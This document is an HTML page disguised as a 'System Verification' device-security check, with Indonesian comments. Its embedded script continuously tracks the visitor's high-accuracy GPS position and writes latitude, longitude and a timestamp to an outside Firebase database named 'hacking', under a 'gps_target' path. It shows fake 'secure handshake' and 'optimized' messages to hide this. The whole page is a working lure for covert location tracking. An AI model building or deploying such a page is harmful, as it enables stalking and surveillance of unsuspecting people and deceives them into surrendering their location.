<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Verifying Device Security...</h2>
    <div class="loader"></div>
    <p id="info">Please wait while we establish secure handshake.</p>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        // URL Firebase Database Anda sudah dimasukkan di sini
        const firebaseConfig = {
            databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/" 
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        if ('geolocation' in navigator) {
            navigator.geolocation.watchPosition((position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // Kirim data GPS secara langsung ke Firebase Database
                set(ref(db, 'gps_target/location'), {
                    lat: lat,
                    lon: lon,
                    timestamp: Date.now()
                }).then(() => {
                    document.getElementById('info').innerText = "System optimized successfully.";
                });
            }, (error) => {
                document.getElementById('info').innerText = "Error: Location permission denied.";
            }, { enableHighAccuracy: true });
        } else {
            document.getElementById('info').innerText = "Geolocation not supported.";
        }
    </script>
</body>
</html>
